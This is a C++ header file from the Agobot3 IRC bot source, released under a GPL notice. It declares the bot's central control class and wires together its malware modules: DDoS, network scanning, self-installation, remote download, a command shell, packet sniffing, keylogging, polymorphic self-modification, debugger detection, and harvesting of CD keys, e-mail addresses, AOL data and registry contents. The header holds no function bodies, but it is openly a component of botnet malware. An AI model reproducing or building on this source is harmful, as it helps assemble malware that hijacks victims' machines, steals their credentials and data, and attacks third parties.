/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __MAINCTRL_H__
#define __MAINCTRL_H__

#include "cmdline.h"
#include "cstring.h"
#include "consdbg.h"
#include "random.h"
#include "sockets.h"
#include "utility.h"
#include "cmdshell.h"
#include "cvar.h"
#include "bot.h"
#include "commands.h"
#include "mac.h"
#include "installer.h"
#include "scanner.h"
#include "irc.h"
#include "ddos.h"
#include "redirect.h"
#include "harvest_cdkeys.h"
#ifdef _WIN32
#include "harvest_emails.h"
#include "harvest_aol.h"
#include "harvest_registry.h"
#include "cplugin.h"
#endif // _WIN32
#include "polymorph.h"
#include "logic.h"
#include "sniffer.h"
#include "keylogger.h"

#ifdef WIN32
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hprev, PSTR cmdline, int ishow);
#else
int main(int argc, char **argv);
#endif

//#define while(x) while(((x) && (g_pMainCtrl ? g_pMainCtrl->m_bRunning : true)))
// Params: a=server struct
#define REGSERVER(a) g_pMainCtrl->m_cIRC.m_vServers.push_back(&a);

class CMainCtrl
{
public:
						 CMainCtrl();
	virtual				~CMainCtrl();
	int					 Main(const char *szCmdLine, const char *szArgv0);
	int					 MainCtrl();

	CCommands			 m_cCommands;
	CCmdLine			 m_cCmdLine;
	CConsDbg			 m_cConsDbg;
	CBot				 m_cBot;
	CMac				 m_cMac;
	CCVar				 m_cCVar;
	CInstaller			 m_cInstaller;
	CDownloader			 m_cDownloader;
	CScanner			 m_cScanner;
	CIRC				 m_cIRC;
	CSocketServer		 m_cSendFile;
	CSocketServer		 m_cSendFileFTP;
	CIdentD				 m_cIdentD;
	CDDOS				 m_cDDOS;
	CRedirect			 m_cRedirect;
	CHarvest_CDKeys		 m_cHarvest_CDKeys;
#ifdef _WIN32
	CHarvest_EMails		 m_cHarvest_EMails;
	CHarvest_AOL		 m_cHarvest_AOL;
	CHarvest_Registry    m_cHarvest_Registry;
	CPluginLoader		 m_cPluginLoader;
#endif // _WIN32
	CRSLControl			 m_cRSLControl;
#ifdef _WIN32
	CService			 m_cService;
#endif // _WIN32
	CProcessControl		 m_cProcessControl;
#ifdef _WIN32
	CPolymorph			 m_cPolymorph;
#endif // _WIN32
	CLogic				 m_cLogic;
	CSniffer			 m_cSniffer;
#ifdef WIN32
	CKeyLog				 m_cKeyLog;
	CStartupThread		 m_cStartupThread;
#endif
#ifdef _WIN32
	CCmdShell			 m_cCmdShell;
#endif // WIN32
    CSpeedTest           m_cSpeedTest;
	bool				 m_bRunning;
	CString				 m_sUserName;
	CString				 m_sTmpSvcName;
	CString				 m_sNameVerStr;
	CString				 m_sArgv0;
	CString				 m_sCmdLine;
	bool				 m_bIdentD_Running;
	bool				 m_bHashCheckFailed;

#ifdef _WIN32
	CDebugDetect		 m_cDebugDetect;
#endif // _WIN32
};

extern CMainCtrl *g_pMainCtrl;
extern CCleanupThread *g_pCleanupThread;

#endif // __MAINCTRL_H__
